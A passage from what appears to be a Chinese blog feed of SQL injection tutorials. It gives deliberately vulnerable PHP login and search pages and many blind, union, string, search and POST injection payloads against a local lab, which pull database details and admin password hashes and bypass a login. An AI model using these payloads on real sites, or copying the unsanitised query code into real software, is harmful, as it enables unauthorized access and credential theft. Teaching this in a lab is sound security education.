百分比(%)通配符允许匹配任何字符串的零个或多个字符。 下划线(_)通配符允许匹配任何单个字符。 like ‘r%’ 判断第一个字符是否为r like ‘ro%’ 判断前面两个字符串是否为ro like ‘%ro%’ 判断是否包含ro两个字符串 like ‘%root%’ 判断是否包含root字符串 like ‘____’ 判断是否为4个字符 like ‘r___’ 判断第一个字符是否为r if函数if 条件为真执行，反之不执行语法： if(条件,执行(true),不执行(false)) 其实if很简单，看看下面构造的这个语句就知道了1http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,if(database()='sqlin',1,0),3 判断数据库是否为sqlin，如果是，返回1，否者返回0 sleep函数这个函数也比较简单，但是有一个问题是在真实环境中，可能受网络环境影响，而导致效果不是太明显sleep 执行延时number秒语法： sleep(number)一般这个函数搭配if语句一起用比如我们可以用这个函数判断是否有sqlin数据库1http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,sleep(if(database()='sqlin',10,0)),3 判断数据库否有为sqlin，如果有返回的10带入到sleep，让网页延时10秒返回页面，否则网页延时0秒如果秒速调高一点还是有用的，但是只返回1和0秒就基本废了 length函数用于判断长度，返回0和1，比较常用length 统计字符串的长度语法： length(number)123http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,length(database())=5,3http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,if(length(database())=5,1,0),3http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,if(length(database())&gt;1,1,0),3 这个可以用&gt; &lt; = 符号，默认就是返回1和0，这里加上if看着更清晰 mid和substr函数这两个函数基本差不多，都是从number开始，number结束，截取，这个是从1开始，而不是从0开始mid,substr 截取字符串的一部分语法： mid(字段,起始位置(number),长度(number))123http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,mid(database(),1,1)='s',3http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,mid(database(),2,1)='q',3http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,mid(database(),1,5)='sqlin',3 //从第一个开始，取5个字符 substr(字段,起始位置(number),长度(number))123http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,substr(database(),1,1)='s',3http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,substr(database(),2,1)='q',3http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,substr(database(),1,5)='sqlin',3 //从第一个开始，取5个字符 ORD函数这个函数只能返回字符串的第一个字符，所以建议加上mid函数ORD 返回第一个字符串的ASCII码sqlin 转换为ascii码=115 113 108 105 110语法： ord(x)1234http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,ord(database())=115,3http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,ord(mid(database(),1,1))=115,3 //115=shttp://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,ord(mid(database(),2,1))=113,3 //113=q//当然这个也是支持 &gt; &lt; = 符号的 left函数left 得到字符串左部指定个数的字符left(string,number) string为字符串，number为要截取的长度123http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,left(database(),1)='s',3http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,left(database(),2)='sq',3http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,left(database(),5)='sqlin',3 regexp正则这个正则是一个很好用的匹配方式，比如匹配sqlin数据库regexp ‘^[a-z]’ 判断一个表的第一个字符串是否在a-z中1http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,database() regexp '^[a-z]',3 regexp ‘^s’ 判断第一个字符串是否为s1http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,database() regexp '^s',3 regexp ‘^s[a-z]’ 判断一个表的第二个字符串是否在a-z中1http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,database() regexp '^s[a-z]',3 like匹配百分比(%)通配符允许匹配任何字符串的零个或多个字符。下划线(_)通配符允许匹配任何单个字符。like ‘s%’ 判断第一个字符是否为s1http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,database() like 's%',3 like ‘sq%’ 判断前面两个字符串是否为sq1http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,database() like 'sq%',3 like ‘%sq%’ 判断是否包含sq两个字符串1http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,database() like '%sq%',3 like ‘%sqlin%’ 判断是否包含sqlin字符串1http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,database() like '%sqlin%',3 like ‘_‘ 判断是否为5个字符1http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,database() like '_____',3 like ‘s____’ 判断第一个字符是否为s1http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,database() like 's____',3 盲注攻击上面的基本的盲注语句我们已经知道了，现在拿着php代码，来进行盲注代码:1234567891011121314151617181920212223242526272829&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;sql注入&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;!--author: smelondfilename: index.phpblog: http://smelond.com--&gt;&lt;body/&gt;&lt;/html&gt;&lt;?php $id = $_GET['x']; $link=mysqli_connect("127.0.0.1","root","root","sqlin");//连接数据库 if ($link) &#123;//判断数据库是否存在 mysqli_query($link,"set names utf8");//设置编码格式 $sql="select * from page where id=$id";//查询 $re=mysqli_query($link,$sql);//执行查询语句 $data=mysqli_fetch_assoc($re);//获取数据库返回的内容 echo "文章id：".$data['id']."&lt;hr /&gt;"; echo "文章标题：".$data['title']."&lt;hr /&gt;"; echo "文章内容：".$data['content']."&lt;hr /&gt;"; echo "当前执行sql语句：".$sql; &#125;else&#123; echo "好像出错了，原因有很多...所以你先去看看你的数据库配置好没。。。"; &#125;?&gt; 数据库：创建sqlin数据库，创建admin表和page表，并且向admin、page表里面分别插入数据1234567891011121314create database sqlin default character set utf8 collate utf8_general_ci;use sqlin;mysql&gt; create table admin( -&gt; id int(3) auto_increment not null primary key, -&gt; username varchar(15) not null, -&gt; password char(32));mysql&gt; create table page( -&gt; id int(3) auto_increment not null primary key, -&gt; title varchar(20), -&gt; content varchar(255));mysql&gt; insert into admin(username,password) values('smelond','efe6398127928f1b2e9ef3207fb82663');mysql&gt; insert into admin(username,password) values('admin','efe6398127928f1b2e9ef3207fb82663');mysql&gt; insert into page(title,content) values('sqlzhuru','https://smelond.com');mysql&gt; insert into page(title,content) values('test','smelond.com'); 判断数据库名，用户，数据版本1http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select database(),user(),version() 盲注：1234567http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,mid(user(),1,1)='r',3http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,substr(user(),1,1)='r',3http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,ord(substr(user(),1,1))=114,3http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,user() like 'ro%',3http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,user() regexp '^[r-s]',3http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,user() regexp '^s',3http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,length(user())&gt;4,3 这里是一些基本的构造语法，其实盲注并不难，主要就是自己构造，但是还是需要知道基本的语法 然后我直接开始进行下面的测试： 获取sqlin数据库下的表名：1234http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,2,3 from information_schema.tables where table_schema='sqlin' and length(table_name)=5 limit 0,1http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,2,3 from information_schema.tables where table_schema='sqlin' and table_name regexp '^[a-z]' limit 0,1http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,2,3 from information_schema.tables where table_schema='sqlin' and table_name regexp '^admi[a-z]' limit 0,1http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,2,3 from information_schema.tables where table_schema='sqlin' and table_name regexp '^admin' limit 0,1 获取到了admin表 我们在用其他方法来获取其他表，方法不止一种，知道了语法自己构造就可以了123456http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,2,3 from information_schema.tables where table_schema='sqlin'http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,if(length((select table_name from information_schema.tables where table_schema='sqlin' limit 1,1))&gt;3,1,0),3 from information_schema.tables where table_schema='sqlin'http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,if(length((select table_name from information_schema.tables where table_schema='sqlin' limit 1,1))=4,1,0),3 from information_schema.tables where table_schema='sqlin'http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,if(mid((select table_name from information_schema.tables where table_schema='sqlin' limit 1,1),1,1)&gt;'a',1,0),3 from information_schema.tables where table_schema='sqlin'http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,if(mid((select table_name from information_schema.tables where table_schema='sqlin' limit 1,1),1,1)='p',1,0),3 from information_schema.tables where table_schema='sqlin'http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,if(mid((select table_name from information_schema.tables where table_schema='sqlin' limit 1,1),1,4)='page',1,0),3 from information_schema.tables where table_schema='sqlin' 这种方法比上面看着要麻烦一些，但是我们还是获取到了page表 获取第二个表名：1234http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,table_name regexp '^page',3 from information_schema.tables where table_schema='sqlin' limit 1,1http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,table_name like 'page',3 from information_schema.tables where table_schema='sqlin' limit 1,1http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,mid(table_name,1,4)='page',3 from information_schema.tables where table_schema='sqlin' limit 1,1http://192.168.32.1/webpentest/mysql/index.php?x=1 and 1=2 union select 1,left(table_name,4)='page',3 from information_schema.tables where table_schema='sqlin' limit 1,1 盲注其实并不难，主要是构造一些奇形怪状语句进行sql攻击，只要知道了语法就可以自己慢慢构造了，趣建议了解一下sql语言]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>web安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sql注入之注入类型]]></title>
    <url>%2F2018%2F04%2F02%2Fsql%E6%B3%A8%E5%85%A5%E4%B9%8B%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B%2F</url>
    <content type="text"><![CDATA[数字型数字型在上一篇文章sql注入之入门，已经讲过 数字型简单的判断是否有注入12and 1=1 //返回正常and 1=2 //返回错误 字符串型如何判断字符串型是否有注入首先先创建一个数据库，在里面分别创建两个表，admin，page，然后在里面插入数据1234567891011121314mysql&gt; create database sqlinstr default character set utf8 collate utf8_general_ci;mysql&gt; use sqlinstr;mysql&gt; create table admin( id int(3) auto_increment not null primary key, username varchar(15) not null, password char(32));mysql&gt; create table page( id int(3) auto_increment not null primary key, title varchar(20), content varchar(255));mysql&gt; insert into admin(username,password) values('smelond','efe6398127928f1b2e9ef3207fb82663');mysql&gt; insert into admin(username,password) values('admin','efe6398127928f1b2e9ef3207fb82663');mysql&gt; insert into page(title,content) values('sqlzhuru','https://smelond.com');mysql&gt; insert into page(title,content) values('test','smelond.com'); 拿着我们的php代码：123456789101112131415161718192021222324252627282930&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;sql注入-注入类型-字符串&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;!--author: smelondfilename: index.phpblog: http://smelond.comsql注入-注入类型-字符串--&gt;&lt;body/&gt;&lt;/html&gt;&lt;?php $id = $_GET['x']; $link=mysqli_connect("127.0.0.1","root","root","sqlinstr");//连接sqlinstr数据库 if ($link) &#123;//判断数据库是否存在 mysqli_query($link,"set names utf8");//设置编码格式 $sql="select * from page where id='$id'";//查询 $re=mysqli_query($link,$sql);//执行查询语句 $data=mysqli_fetch_assoc($re);//获取数据库返回的内容 echo "文章id：".$data['id']."&lt;hr /&gt;"; echo "文章标题：".$data['title']."&lt;hr /&gt;"; echo "文章内容：".$data['content']."&lt;hr /&gt;"; echo "当前执行sql语句：".$sql; &#125;else&#123; echo "好像出错了，原因有很多...所以你先去看看你的数据库配置好没。。。"; &#125;?&gt; 打开我们的网址http://127.0.0.1/webpentest/str/index.php打开会后看到下面的当前执行sql语句：select * from page where id=’’传值进去： 文章id：1文章标题：sqlzhuru文章内容：https://smelond.com当前执行sql语句：select * from page where id=’1’这个时候内容已经查询出来了，但是发现后面的id=’1’，1被单引号括起来了 如何注入首先我们试试：and 1=112http://127.0.0.1/webpentest/str/index.php?x=1 and 1=1 //结果返回正常当前执行sql语句：select * from page where id='1 and 1=1' //有没有发现这里怪怪的 and 1=212http://127.0.0.1/webpentest/str/index.php?x=1 and 1=2 //结果还是返回正常，难道没有注入？？？当前执行sql语句：select * from page where id='1 and 1=2' 从上面我们看到：id=’1 and 1=1’ 和 id=’1 and 1=2’，发现我们输入进去的内容全部被’’包裹起来了那为什么会返回正常呢？打开mysql：123456789101112131415mysql&gt; select id from page where id='1 and 1=1';+----+| id |+----+| 1 |+----+1 row in set, 1 warning (0.00 sec)mysql&gt; select id from page where id='1 and 1=2';+----+| id |+----+| 1 |+----+1 row in set, 1 warning (0.00 sec) 这回知道为什么会有返回值了吧，可以看出空格后面的应该是直接被截断了，所有理论上查询的还是id=1 如何突破由于看到上面每一条sql语句后面都有一个’单引号，前面也有一个所以我们可以在id=1后面加上一个’单引号，看一下是什么效果1http://127.0.0.1/webpentest/str/index.php?x=1' 当我们执行这个网址时，发现页面报错了，这个时候应该就可以判断是否有注入了报错，表示他应该是从数据库里面查询的报错信息：1Warning: mysqli_fetch_assoc() expects parameter 1 to be mysqli_result, boolean given in D:\phpStudy\PHPTutorial\WWW\webpentest\str\index.php on line 21 下面有当前执行sql语句：select * from page where id=’1’’ 可以看到1’成功的带入进去了 接下来继续构造注入语句：12x=1' and '1'='1http://127.0.0.1/webpentest/str/index.php?x=1' and '1'='1 那么执行的语句将会是这样的1当前执行sql语句：select * from page where id='1' and '1'='1' 上面我们又看到id=’1’ and ‘1’=’1’，并且页面返回正常了，这回没毛病了吧，哈哈哈！！！ 接着构造语句：1x=1' and '1'='2 执行语句：1http://127.0.0.1/webpentest/str/index.php?x=1' and '1'='2 现在已经有了我们想要的结果了，页面没有正常显示当前执行的sql语句：1select * from page where id='1' and '1'='2' 使用一些常用的关键字那么，order by在哪里加？在这里，其实order by是不起作用的已经可以看出，and ‘1’=’1后面是不能加了，如果加上去，语句会变成但是加到前面，无论order by number=? 都会是正常返回值，所以，这个地方order by不能用12345select * from page where id='1' and '1'='1 order by 3' select * from page where id='1' and '1'='2 order by 3' http://127.0.0.1/webpentest/str/index.php?x=1' order by 3 and '1'='1 //页面返回正常http://127.0.0.1/webpentest/str/index.php?x=1' order by 4 and '1'='1 //页面返回正常http://127.0.0.1/webpentest/str/index.php?x=1' order by 100 and '1'='1 //页面返回正常 看到上面的100都能返回正常，但是我们数据库里面的page表只有3个字段，所以，可以看出order by在这里是有问题的 既然order by有问题，那我们试试select会怎么样？ 1234http://127.0.0.1/webpentest/str/index.php?x=1' and 1=2 union select 1 and '1'='1 //页面报错http://127.0.0.1/webpentest/str/index.php?x=1' and 1=2 union select 1,2 and '1'='1 //页面报错http://127.0.0.1/webpentest/str/index.php?x=1' and 1=2 union select 1,2,3 and '1'='1 //页面正常显示http://127.0.0.1/webpentest/str/index.php?x=1' and 1=2 union select 1,2,3,4 and '1'='1 //页面报错 select 已经判断出来了有三个字段，在一般情况下，select 1是不会报错的，在字段总数以前都不会报错，可能使我这里的php代码写的有问题，才导致了这种情况发生 接着查询一下数据库里版本，用户等等：1http://127.0.0.1/webpentest/str/index.php?x=1' and 1=2 union select concat(database(),'---',user(),'---',version()),2,3 and '1'='2 结果：sqlinstr---root@localhost---5.5.53 剩下的爆库爆表前面里面已经说过了 但是有一个地方不同，在查询表时，后面的条件需要改动。需要将and ‘1’=’2 改为where ‘1’=’1为什么？接下来我们又进入mysql中查询12345mysql&gt; select username,password from admin and '1'='2';ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'and '1'='2'' at line 1那试试and '1'='1'mysql&gt; select username,password from admin and '1'='1';ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'and '1'='1'' at line 1 结果都报错了那现在该怎么办呢？所以我想问，你有见过查询语句完了之后在后面加上and的吗？所以这个地方得加上条件where如何加？1=1 , ‘1’=’1’所以可已用where ‘1’=’1’12345678mysql&gt; select username,password from admin where '1'='1';+----------+----------------------------------+| username | password |+----------+----------------------------------+| smelond | efe6398127928f1b2e9ef3207fb82663 || admin | efe6398127928f1b2e9ef3207fb82663 |+----------+----------------------------------+2 rows in set (0.00 sec) //现在成功了吧 构造sql语句：1http://127.0.0.1/webpentest/str/index.php?x=1' and 1=2 union select username,password,3 from admin where '1'='1 密码就这样爆出来了 搜索型看了上面的字符串型，好像也不难，就是单引号问题接下来，我们来看看搜索型搜索型一般出现在搜索框当中，我这里写了一个简单的搜索页面标题，返回页面内容的php代码数据库我们还是用上面的sqlinstr数据库代码贴上：12345678910111213141516171819202122232425262728293031323334353637&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;sql注入-注入类型-搜索型&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;!--author: smelondfilename: index.phpblog: http://smelond.comsql注入-注入类型-搜索型--&gt;&lt;form action=""&gt;&lt;input type="text" name="x" id=""&gt; //文本框&lt;input type="submit" name="" id="" value="搜素"&gt; //提交按钮&lt;/form&gt;&lt;body/&gt;&lt;/html&gt;&lt;?php $title = $_GET['x']; //接收x变量，上面文本框的值 $link=mysqli_connect("127.0.0.1","root","root","sqlinstr");//连接sqlinstr数据库 if ($link) &#123;//判断数据库是否存在 mysqli_query($link,"set names utf8");//设置编码格式 $sql="select * from page where title like '%$title%'";//查询，使用了like关键字，查找输入的内容 if ($sql == "select * from page where title like '%%'") &#123; continue; &#125; $re=mysqli_query($link,$sql);//执行查询语句 $data=mysqli_fetch_assoc($re);//获取数据库返回的内容 echo "文章id：".$data['id']."&lt;hr /&gt;"; echo "文章标题：".$data['title']."&lt;hr /&gt;"; echo "文章内容：".$data['content']."&lt;hr /&gt;"; echo "当前执行sql语句：".$sql; &#125;else&#123; echo "好像出错了，原因有很多...所以你先去看看你的数据库配置好没。。。"; &#125;?&gt; 上面可以看到我们php代码里面的两个“%”百分号查询语句将会为：select * from page where title like ‘%%’如果我们在里面加入内容，查询语句将会为：1select * from page where title like '%test%' //查询title='test'的内容 如何突破突破其实也很简单，上面的字符串类型为’’这里的搜索型为’%%’那我们直接利用字符串的思路，将搜索%’闭合1test%' and '100%'='100 那么我们构造执行的语句将会是这样的：1http://127.0.0.1/webpentest/search/index.php?x=test%' and '100%'='100 语句结果：1当前执行sql语句：select * from page where title like '%test%' and '100%'='100%' //正常返回，并且所搜到了test的内容，返回了页面内容 构造其他的语句：123456http://127.0.0.1/webpentest/search/index.php?x=test%' and 1=1 order by 4 and '100%'='100 //返回正确，显然order by还是不能用。。。http://127.0.0.1/webpentest/search/index.php?x=test%' and 1=2 union select 1 and '100%'='100 //错误http://127.0.0.1/webpentest/search/index.php?x=test%' and 1=2 union select 1,2 and '100%'='100 //错误http://127.0.0.1/webpentest/search/index.php?x=test%' and 1=2 union select 1,2,3 and '100%'='100 //正确，判断出来了3个字段http://127.0.0.1/webpentest/search/index.php?x=test%' and 1=2 union select 1,2,3,4 and '100%'='100 //错误http://127.0.0.1/webpentest/search/index.php?x=test%' and 1=2 union select username,password,3 from admin where '100%'='100 构造其他的语句就简单了但是记得在爆库表爆字段，查询账号密码时记得额将and ‘100%’=’100改为where ‘100%’=’100 提交注入两种常见的提交注入：分别是GET和POSTGET我们已经在上面说了，比如搜索框，还有就是在网址上，总之前面说到的所有注入全部都是GET型我们可以从前面的php代码中发现这段代码1$id = $_GET['x']; 那么，POST提交当然就是这样写的:1$id = $_POST['x']; 很简单，直接将GET写为POST即可 这两种请求有什么区别？ 听说这是标准答案： GET在浏览器回退时是无害的，而POST会再次提交请求。 GET产生的URL地址可以被Bookmark，而POST不可以。 GET请求会被浏览器主动cache，而POST不会，除非手动设置。 GET请求只能进行url编码，而POST支持多种编码方式。 GET请求参数会被完整保留在浏览器历史记录里，而POST中的参数不会被保留。 GET请求在URL中传送的参数是有长度限制的，而POST么有。 对参数的数据类型，GET只接受ASCII字符，而POST没有限制。 GET比POST更不安全，因为参数直接暴露在URL上，所以不能用来传递敏感信息。 GET参数通过URL传递，POST放在Request body中。 有一篇文章99%的人理解错 HTTP 中 GET 与 POST 的区别，否定了上述回答：“很遗憾，这不是我们要的回答！”，作者说：GET和POST本质上就是TCP链接，并无差别。但是由于HTTP的规定和浏览器/服务器的限制，导致他们在应用过程中体现出一些不同。 GET和POST还有一个重大区别，简单的说：GET产生一个TCP数据包；POST产生两个TCP数据包。对于GET方式的请求，浏览器会把http header和data一并发送出去，服务器响应200（返回数据）； 而对于POST，浏览器先发送header，服务器响应100 continue，浏览器再发送data，服务器响应200 ok（返回数据）。 感觉这篇文章还是比较高大上的这里先不扯这么多了，了解了post和get的区别之后我们来看看post提交注入 post提交注入还是用前面用过的数据库sqlinstr，但是表用admin表，因为这是登录，需要验证是否登录成功，具体看代码 贴上我的html+php代码：文件名：index.html登录页面12345678910111213141516171819202122232425&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;sql注入-POST提交注入-登录框&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;!--author: smelondfilename: index.phpblog: http://smelond.comsql注入-POST提交注入-登录框--&gt; &lt;div style="margin: 0px auto;width: 400px;text-align: center;"&gt; &lt;form action="index.php" method="POST"&gt; &lt;fieldset&gt; &lt;legend&gt;登录&lt;/legend&gt; &lt;input type="text" name="username" placeholder="请输入用户名"&gt;&lt;br&gt; &lt;input type="password" name="password" placeholder="请输入密码"&gt;&lt;br&gt; &lt;input type="submit" name="sub" value="登录"&gt;&lt;br&gt; &lt;/fieldset&gt; &lt;/form&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 文件名：index.php后台页面1234567891011121314151617181920212223242526272829303132333435363738394041&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;sql注入-POST提交注入-后台页面&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;!-- author: smelond filename: index.php blog: http://smelond.com sql注入-POST提交注入-后台页面 --&gt;&lt;/body&gt;&lt;/html&gt;&lt;?php $username = $_POST['username']; $password = $_POST['password']; if ($username == '') &#123; exit("用户名不能为空"); &#125; if ($password == '') &#123; exit("密码不能为空"); &#125; $password = md5($password); // echo "$password"; $link = mysqli_connect("127.0.0.1","root","root","sqlinstr");//连接sqlinstr数据库 if ($link) &#123;//判断数据库是否存在 mysqli_query($link,"set names utf8");//设置编码格式 $sql = "select * from admin where username='$username' and password='$password'";//查询 $re = mysqli_query($link,$sql);//执行查询语句 $data = mysqli_fetch_assoc($re);//获取数据库返回的内容 if ($data) &#123;//判断是否有返回值 // var_dump($data); echo "后台页面：&lt;br /&gt;"; echo "欢迎你：".$username; &#125;else&#123;//否者错误 echo "用户名或密码不正确"; &#125; echo "&lt;br /&gt;"."当前执行sql语句：".$sql; &#125;else&#123; echo "好像出错了，原因有很多...所以你先去看看你的数据库配置好没。。。"; &#125;?&gt; 现在打开我们的url：1http://127.0.0.1/webpentest/postrequest/index.html 看到登录页面已经写好了，试着登录一下登录成功 那么怎么绕过，直接登录呢？从登陆页面的sql语句中可以看到语句为：1select * from admin where username='smelond' and password='efe6398127928f1b2e9ef3207fb82663' 想了想，这个语句应该可以直接注释吧？好了，返回index.html页面我们去注释一下12账号：smelond#密码：asdfas 发现登录失败看看，我们只是单纯的在用户名后面加上了#号，那么现在语句变成了：1select * from admin where username='smelond 看看我们构造的语句，明显不完整 那我们来构造一条完整的语句：12smelond'# //#号将后面的注释了select * from admin where username='smelond' //所以语句直接变成了这个 一般我们会这样写：12smelond' or 1=1#select * from admin where username='smelond' or 1=1 页面上显示了欢迎你，我们已经进入后台了 如果后台有查询数据库，那我们可以直接在登录页面将爆库，爆表，爆密码： 那我们将上面的后台代码修改一下，让他有数据库查询，并且回显：123456789101112131415161718192021222324252627282930313233343536373839404142&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;sql注入-POST提交注入-后台页面&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;!-- author: smelond filename: index.php blog: http://smelond.com sql注入-POST提交注入-后台页面 --&gt;&lt;/body&gt;&lt;/html&gt;&lt;?php $username = $_POST['username']; $password = $_POST['password']; if ($username == '') &#123; exit("用户名不能为空"); &#125; if ($password == '') &#123; exit("密码不能为空"); &#125; $password = md5($password); // echo "$password"; $link = mysqli_connect("127.0.0.1","root","root","sqlinstr");//连接sqlinstr数据库 if ($link) &#123;//判断数据库是否存在 mysqli_query($link,"set names utf8");//设置编码格式 $sql = "select * from admin where username='$username' and password='$password'";//查询 $re = mysqli_query($link,$sql);//执行查询语句 $data = mysqli_fetch_assoc($re);//获取数据库返回的内容 if ($data) &#123;//判断是否有返回值 // var_dump($data); echo "后台页面：&lt;br /&gt;"; // echo "欢迎你：".$username; echo "欢迎你：".$data['username']."&lt;hr /&gt;"; //我们只修改了这句 &#125;else&#123;//否者错误 echo "用户名或密码不正确"; &#125; echo "&lt;br /&gt;"."当前执行sql语句：".$sql; &#125;else&#123; echo "好像出错了，原因有很多...所以你先去看看你的数据库配置好没。。。"; &#125;?&gt; 上面我们只修改了一句，但是效果就不一样了打开index.html在账号框中输入：1' and 1=2 union select 1,2,3 or 1=1# 这个时候，可以看到成功登录，并且用户名为：2注意回显的是2，所以我们在登录框输入时，只能改动2，其他地方改动无效、 接着从新输入：1' and 1=2 union select 1,database(),3 or 1=1# 用户名：sqlinstr 这个时候我们输入用concat是最好不过的了1' and 1=2 union select 1,concat(database(),'---',user(),'---',version()),3 or 1=1# 用户名：sqlinstr---root@localhost---5.5.53 爆账号密码：1asd' and 1=1 union select 1,concat(username,'--',password),3 from admin where 1=1#asad 注意，在简单的查询语句后面不能加and 和 or ，所以我们这里加上了where 好了，差不多了，这个SQL注入类型就先说这么多~~当然，注入里面还有其他的注入，比如：cookie注入，http头注入]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>web安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sql注入之入门]]></title>
    <url>%2F2018%2F03%2F28%2Fsql%E6%B3%A8%E5%85%A5%E4%B9%8B%E5%85%A5%E9%97%A8%2F</url>
    <content type="text"><![CDATA[MySql基础语法mysql无非就是增删改查 mysql数据库结构： 数据库 test,test1 表名 admin,manage 数据 id,username,password 现在，为了我们接下来的实验，我们需要切换数据库到test，mysql自带一个test数据库，没有装mysql的自行百度切换方式：12mysql&gt; use test;Database changed //有这条提示就切换成功了 create 创建表 首先我们先来创建一个表名为：admin，里面包含了id，username，password，email：123456mysql&gt; create table admin( -&gt; id int(3) auto_increment not null primary key, -&gt; username varchar(15) not null, -&gt; password char(32), -&gt; email varchar(30));Query OK, 0 rows affected (0.01 sec) --有了这个提示就是创建成功了 现在我们已经成功创建了一个,可以用desc来查看表结构：12345678910mysql&gt; desc admin;+----------+-------------+------+-----+---------+----------------+| Field | Type | Null | Key | Default | Extra |+----------+-------------+------+-----+---------+----------------+| id | int(3) | NO | PRI | NULL | auto_increment || username | varchar(15) | NO | | NULL | || password | char(32) | YES | | NULL | || email | varchar(30) | YES | | NULL | |+----------+-------------+------+-----+---------+----------------+4 rows in set (0.04 sec) insert 插入数据 接着上面的表，我们想表里面插入一条数据12mysql&gt; insert into admin(username,password,email) values('smelond','qweqwe','2698115328@qq.com'); --为什么没有指定id列，因为我们在创建表时给id指定了自动增值(auto_increment)Query OK, 1 row affected (0.00 sec) select 查询语句 上面我们已经向数据库里面插入了一条数据了，现在我们可以查询一下是否插入成功1234567mysql&gt; select * from admin;+----+----------+----------+-------------------+| id | username | password | email |+----+----------+----------+-------------------+| 1 | smelond | qweqwe | 2698115328@qq.com |+----+----------+----------+-------------------+1 row in set (0.00 sec) --已经看到了，数据已经插入进去，并且id号为1，如果我们下次插入id号会自动增长 update 修改表中的数据 现在我们为admin数据表在次插入一条数据12mysql&gt; insert into admin(username,password,email) values('admin','qweqwe','xxx@163.com');Query OK, 1 row affected (0.00 sec) 插入完成以后用updata修改admin的密码为asdasd,(从原来的qweqwe修改为asdasd)123mysql&gt; update admin set password='asdasd' where username='admin'; --修改passwrod为asdasd，条件是username=adminQuery OK, 1 row affected (0.00 sec)Rows matched: 1 Changed: 1 Warnings: 0 接着我们查询一下是否修改成功12345678mysql&gt; select * from admin;+----+----------+----------+-------------------+| id | username | password | email |+----+----------+----------+-------------------+| 1 | smelond | qweqwe | 2698115328@qq.com || 2 | admin | asdasd | xxx@163.com |+----+----------+----------+-------------------+2 rows in set (0.00 sec) delete 删除表中的数据 上面我们已经向表中插入了两条数据了现在我们试着将表中的数据删除12345mysql&gt; delete from admin where username='admin';Query OK, 1 row affected (0.00 